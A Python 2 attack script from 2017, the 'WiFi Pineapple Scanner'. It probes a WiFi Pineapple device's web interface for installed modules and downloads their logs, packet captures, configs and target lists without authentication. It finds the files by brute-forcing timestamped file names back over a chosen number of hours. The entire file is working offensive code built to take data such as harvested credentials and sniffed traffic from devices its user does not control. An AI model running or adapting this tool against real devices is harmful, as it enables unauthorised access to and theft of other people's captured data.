#!/usr/bin/python
#
# Made by Jarkko Vesiluoma - 2017
#
#
import requests, socket, sys, time

# Change this to dictionary
moduleslist = {"/modules/Commander/module.info","/modules/EvilPortal/module.info","/modules/CursedScreech/module.info","/modules/Responder/module.info","/modules/DNSspoof/module.info","/modules/ettercap/module.info","/modules/urlsnarf/module.info","/modules/nmap/module.info","/modules/SiteSurvey/module.info","/modules/DNSMasqSpoof/module.info","/modules/get/module.info","/modules/p0f/module.info"}

def asciiart():
  print "================================================================================"
  print " __      __  .__  __________                                                    "
  print "/  \    /  \ |__| \______   \ ____                                              "
  print "\   \/\/   / |  |  |     ___// __ \                                             "
  print " \        /  |  |  |    |   \  ___/                                             "
  print "  \__/\  /   |__|  |____|    \___  >                                            "
  print "       \/                        \/                                             "
  print "                _________                                                       "
  print "               /   _____/   ____   _____      ____     ____     ____   _______  "
  print "               \_____  \  _/ ___\  \__  \    /    \   /    \  _/ __ \  \_  __ \ "
  print "               /        \ \  \___   / __ \_ |   |  \ |   |  \ \  ___/   |  | \/ "
  print "              /_______  /  \___  > (____  / |___|  / |___|  /  \___  >  |__|    "
  print "                      \/       \/       \/       \/       \/       \/           "
  print "================================================================================"



def checkmodules(host):
  print "[*] Checking modules..."

  # Change this to dictionary
  modulelist=[]
  for module in moduleslist:
    response =  requests.get("http://"+host+module, headers={"User-Agent": "Wifi Pineapple scanner. All Your Logs Are Belong To Us."})
    if response.status_code == 200:
      print "[*] http://"+host+module + " found!"
      modulelist.append(host+module)
      # Add to list for enumeration
  return modulelist

def fetchmodulelog(urlin,etime,currtime):
  foundok = 0
  enumtime = etime
  response =  requests.get(urlin, headers={"User-Agent": "Wifi Pineapple scanner. All Your Logs Are Belong To Us."})
  if response.status_code == 200:
    print "    [*] Log file (http://" + urlin + ") found!"
    with open("logs/" + urlin.split('/')[4] + "-" + str(currtime) + "-" + urlin.rsplit('/',1)[1], "wb") as logfile:
      logfile.write(response.content)
      foundok = 1
    print "    [*] Logfile downloaded!"

  return foundok

def enumeratemodule(url,etime,currtime):
  print "  [*] Enumerating module url " + url.split('/')[2] + "..."

  # EVIL PORTAL
  if 'EvilPortal' in url:
    enumtime = etime
    response = ""
    print "    [*] Trying to fetch Evil Portal logs..."
    fetchmodulelog("http://" + url.rsplit('/',1)[0] + "/data/allowed.txt", 1, 1)
    fetchmodulelog("http://" + url.rsplit('/',1)[0] + "/executable/executable", 1,1)
    fetchmodulelog("http://" + url.rsplit('/',1)[0] + "/includes/evilportal.sh", 1, 1)

  # Commander
  if 'Commander' in url:
    enumtime = etime
    response = ""
    print "    [*] Trying to fetch Commander logs..."
    fetchmodulelog("http://" + url.rsplit('/',1)[0] + "/assets/default.conf", etime, currtime)

  # CursedScreech
  if 'CursedScreech' in url:
    enumtime = etime
    response = ""
    print "    [*] Trying to fetch CursedScreech logs..."
    fetchmodulelog("http://" + url.rsplit('/',1)[0] + "/includes/forest/activity.log", etime, currtime)
    fetchmodulelog("http://" + url.rsplit('/',1)[0] + "/includes/forest/cmd.log", etime, currtime)
    fetchmodulelog("http://" + url.rsplit('/',1)[0] + "/includes/forest/settings", etime, currtime)
    fetchmodulelog("http://" + url.rsplit('/',1)[0] + "/includes/forest/targets.log", etime, currtime)

  # Responder
  if 'Responder' in url:
    enumtime = etime
    response = ""
    print "    [*] Trying to brute force Responder logs..."
    fetchmodulelog("http://" + url.rsplit('/',1)[0] + "/logs/Analyzer-Session.log", etime, currtime)
    fetchmodulelog("http://" + url.rsplit('/',1)[0] + "/logs/Poisoners-Session.log", etime, currtime)
    fetchmodulelog("http://" + url.rsplit('/',1)[0] + "/logs/Responder-Session.log", etime, currtime)


  # URLSNARF
  if 'urlsnarf' in url:
    enumtime = etime
    print "    [*] Trying to brute force Urlsnarf logs..."
    response = ""
    while enumtime < currtime:
      percentage = '{0:.2f}'.format(100-((1.0 * (currtime - enumtime) / (currtime - etime)) * 100))
      sys.stdout.write('      [*] Percentage done %s\r' % str(percentage)),
      sys.stdout.flush()
      fetchmodulelog("http://" + url.rsplit('/',1)[0] + "/log/output_" + str(enumtime) + ".log", etime, currtime)
      enumtime+=1

  # ETTERCAP
  if 'ettercap' in url:
    enumtime = etime
    response = ""
    print "    [*] Trying to fetch ettercap logs..."
    while enumtime < currtime:
      percentage = '{0:.2f}'.format(100-((1.0 * (currtime - enumtime) / (currtime - etime)) * 100))
      sys.stdout.write('      [*] Percentage done %s\r' % str(percentage)),
      sys.stdout.flush()
      if fetchmodulelog("http://" + url.rsplit('/',1)[0] + "/log/log_" + str(enumtime) + ".log", etime, currtime) == 1:
        fetchmodulelog("http://" + url.rsplit('/',1)[0] + "/log/log_" + str(enumtime) + ".pcap", etime, currtime)
      enumtime+=1

  # NMAP
  if 'nmap' in url:
    enumtime = etime
    response = ""
    print "    [*] Trying to fetch NMAP logs..."
    while enumtime < currtime:
      percentage = '{0:.2f}'.format(100-((1.0 * (currtime - enumtime) / (currtime - etime)) * 100))
      sys.stdout.write('      [*] Percentage done %s\r' % str(percentage)),
      sys.stdout.flush()
      fetchmodulelog("http://" + url.rsplit('/',1)[0] + "/scan/scan_" + str(enumtime), etime, currtime)
      enumtime+=1

  # SITE SURVEY
  if 'SiteSurvey' in url:
    enumtime = etime
    response = ""
    print "    [*] Trying to fetch Site Survey logs..."
    while enumtime < currtime:
      percentage = '{0:.2f}'.format(100-((1.0 * (currtime - enumtime) / (currtime - etime)) * 100))
      sys.stdout.write('      [*] Percentage done %s\r' % str(percentage)),
      sys.stdout.flush()
      if fetchmodulelog("http://" + url.rsplit('/',1)[0] + "/capture/capture_" + str(enumtime) + "-01.cap", etime, currtime) == 1:
        fetchmodulelog("http://" + url.rsplit('/',1)[0] + "/capture/capture_" + str(enumtime) + "-01.csv", etime, currtime)
        fetchmodulelog("http://" + url.rsplit('/',1)[0] + "/capture/capture_" + str(enumtime) + "-01.kismet.csv", etime, currtime)
        fetchmodulelog("http://" + url.rsplit('/',1)[0] + "/capture/capture_" + str(enumtime) + "-01.kismet.netxml", etime, currtime)
      enumtime+=1

  # SSLSPLIT
  if 'sslsplit' in url:
    enumtime = etime
    response = ""
    print "    [*] Trying to brute force SSLSplit logs..."
    while enumtime < currtime:
      percentage = '{0:.2f}'.format(100-((1.0 * (currtime - enumtime) / (currtime - etime)) * 100))
      sys.stdout.write('      [*] Percentage done %s\r' % str(percentage)),
      sys.stdout.flush()
      fetchmodulelog("http://" + url.rsplit('/',1)[0] + "/log/output_" + str(enumtime) + ".log", etime, currtime)
      enumtime+=1

  # TCPDUMP
  if 'tcpdump' in url:
    enumtime = etime
    response = ""
    print "    [*] Trying to brute force tcpdump logs..."
    while enumtime < currtime:
      percentage = '{0:.2f}'.format(100-((1.0 * (currtime - enumtime) / (currtime - etime)) * 100))
      sys.stdout.write('      [*] Percentage done %s\r' % str(percentage)),
      sys.stdout.flush()

      fetchmodulelog("http://" + url.rsplit('/',1)[0] + "/dump/dump_" + str(enumtime) + ".pcap", etime, currtime)
      enumtime+=1

  # DNS MASQspoof
  if 'DNSMasqSpoof' in url:
    enumtime = etime
    response = ""
    print "    [*] Trying to brute force DNS MASQspoof logs..."
    while enumtime < currtime:
      percentage = '{0:.2f}'.format(100-((1.0 * (currtime - enumtime) / (currtime - etime)) * 100))
      sys.stdout.write('      [*] Percentage done %s\r' % str(percentage)),
      sys.stdout.flush()
      # CHECK THIS
      fetchmodulelog("http://" + url.rsplit('/',1)[0] + "/log/output_" + str(enumtime) + ".log", etime, currtime)
      enumtime+=1

  # DNSspoof
  if 'DNSspoof' in url:
    enumtime = etime
    response = ""
    print "    [*] Trying to brute force DNSspoof logs..."
    while enumtime < currtime:
      percentage = '{0:.2f}'.format(100-((1.0 * (currtime - enumtime) / (currtime - etime)) * 100))
      sys.stdout.write('      [*] Percentage done %s\r' % str(percentage)),
      sys.stdout.flush()
      fetchmodulelog("http://" + url.rsplit('/',1)[0] + "/log/output_" + str(enumtime) + ".log", etime, currtime)
      enumtime+=1

  # DWALL
  # ? 

  # get
  # ? 

  # p0f
  if 'p0f' in url:
    enumtime = etime
    response = ""
    print "    [*] Trying to brute force p0f logs..."
    while enumtime < currtime:
      percentage = '{0:.2f}'.format(100-((1.0 * (currtime - enumtime) / (currtime - etime)) * 100))
      sys.stdout.write('    [*] Percentage done %s\r' % str(percentage)),
      sys.stdout.flush()

      fetchmodulelog("http://" + url.rsplit('/',1)[0] + "/log/output_" + str(enumtime) + ".log", etime, currtime)
      enumtime+=1

  print "[*] Scanning done!"


def main(argv):

  asciiart()

  host = ''
  checktime = 0
  enumepochtime = 0
  currepochtime = 0

  try:
    host = sys.argv[1]
    checktime = int(sys.argv[2])
    print "[*] Checking host " + host + ". Start at " + time.strftime('%Y-%m-%d %H:%M:%S') + "."
    currepoch = int(time.strftime('%s'))
    enumepochtime = int(currepoch) - (int(sys.argv[2]) * 3600)
    print "[*] Checking " + str(checktime) + " hours backwards."

  except:
    print "Usage: " + sys.argv[0] + " <IP and port> <time backwards in hours>"
    print "e.g.:  " + sys.argv[0] + " 172.16.42.1:1471 2"
    exit()

  moduleslist=[]
  if host != "":
    moduleslist=checkmodules(host)

    for module in moduleslist:
      enumeratemodule(module,enumepochtime,currepoch)

if __name__ == "__main__":
  main(sys.argv[1:])
